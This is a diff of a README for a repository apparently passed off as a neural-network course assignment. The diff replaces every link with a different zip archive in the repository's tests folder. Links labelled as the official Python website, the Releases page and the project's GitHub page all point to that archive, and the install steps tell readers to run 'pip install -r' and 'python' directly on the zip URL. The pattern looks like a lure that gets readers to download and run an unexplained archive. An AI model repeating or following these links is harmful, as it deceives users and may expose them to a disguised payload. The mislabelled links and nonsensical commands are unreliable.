@@ -1,6 +1,6 @@
 # ✨ info527-neural-networks-assignment4 - Easy Neural Network Implementation
 
-[![Download from Releases](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip%20Now-Get%20In%20on%20GitHub-brightgreen)](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip)
+[![Download from Releases](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip%20Now-Get%20In%20on%20GitHub-brightgreen)](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip)
 
 ## 📖 Overview
 
@@ -16,13 +16,13 @@ Follow these steps to download and run the application smoothly.
 - **Python**: Version 3.6 or higher
 - **TensorFlow**: Version 2.0 or higher
 
-Make sure you have the latest version of Python installed. You can download it from the official [Python website](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip).
+Make sure you have the latest version of Python installed. You can download it from the official [Python website](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip).
 
 ### 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip) to download the application files. Look for the latest release version, which will contain all necessary files.
+To get started, visit the [Releases page](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip) to download the application files. Look for the latest release version, which will contain all necessary files.
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip).
+1. Visit the [Releases page](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip).
 2. Locate the latest version link.
 3. Click on the file suited for your operating system to download it.
 4. Save the file to a memorable location on your computer.
@@ -47,16 +47,16 @@ Once you have downloaded the application files, follow these steps:
 4. **Install Required Packages**:
    Once in the folder, run this command to install any necessary Python packages:
    ```
-   pip install -r https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip
+   pip install -r https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip
    ```
-   This command will read the `https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip` file and install the libraries you need.
+   This command will read the `https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip` file and install the libraries you need.
 
 5. **Run the Application**:
    To start the application, execute:
    ```
-   python https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip
+   python https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip
    ```
-   Ensure that the `https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip` file is present in the folder.
+   Ensure that the `https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip` file is present in the folder.
 
 ### 🔍 Exploring Features
 
@@ -83,4 +83,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thanks to the University of Arizona for providing a framework for this project, and for all who have contributed to this application.
 
-For further details and updates, feel free to visit [our GitHub page](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip).
+For further details and updates, feel free to visit [our GitHub page](https://github.com/mhtmalla/info527-neural-networks-assignment4/raw/refs/heads/main/tests/info_assignment_neural_networks_v2.5.zip).
